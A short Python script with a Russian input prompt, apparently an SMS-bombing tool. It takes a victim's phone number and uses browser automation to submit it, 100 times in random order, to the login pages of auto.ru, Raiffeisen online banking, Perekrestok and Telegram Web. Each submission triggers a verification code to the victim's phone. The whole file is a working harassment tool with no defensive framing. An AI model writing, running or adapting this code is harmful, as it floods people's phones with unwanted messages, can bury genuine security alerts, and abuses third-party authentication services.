import keyboard, os, time, random
import pyautogui as pg
number = input("Введите номер (Пример: +76665554433): ")
def autoru():
    global number
    os.system("start chrome.exe https://auth.auto.ru/login/?r=https%3A%2F%2Fauto.ru%2F")
    time.sleep(2)
    keyboard.write(number)
    time.sleep(0.5)
    keyboard.send("Enter")
    time.sleep(1)
    keyboard.press('alt')
    keyboard.press('f4')
    keyboard.release('f4')
    keyboard.release('alt')

def rf():
    global number
    os.system("start chrome.exe https://online.raiffeisen.ru/login/main")
    time.sleep(3)
    keyboard.write(number[2:])
    time.sleep(1)
    keyboard.send("Enter")
    time.sleep(1)
    keyboard.press('alt')
    keyboard.press('f4')
    keyboard.release('f4')
    keyboard.release('alt')

def x5():
    global number
    pg.moveTo(960, 425)
    os.system("start chrome.exe https://perekrestok.ru/login")
    time.sleep(5)
    pg.click(button="left")
    time.sleep(1)
    keyboard.write(number[2:])
    time.sleep(0.5)
    keyboard.send("Enter")
    time.sleep(1)
    keyboard.press('alt')
    keyboard.press('f4')
    keyboard.release('f4')
    keyboard.release('alt')

def tg():
    global number
    pg.moveTo(950, 670)
    os.system("start chrome.exe https://web.telegram.org/a/")
    time.sleep(5)
    pg.click(button="left")
    time.sleep(2)
    pg.click(button="left")
    time.sleep(2)
    keyboard.write(number[2:])
    time.sleep(0.5)
    keyboard.send("Enter")
    time.sleep(1)
    keyboard.press('alt')
    keyboard.press('f4')
    keyboard.release('f4')
    keyboard.release('alt')

def random_service():
    rand = random.randint(1, 4)
    if rand == 1:
        autoru()
    elif rand == 2:
        rf()
    elif rand == 3:
        x5()
    else:
        tg()

for i in range(100):
    random_service()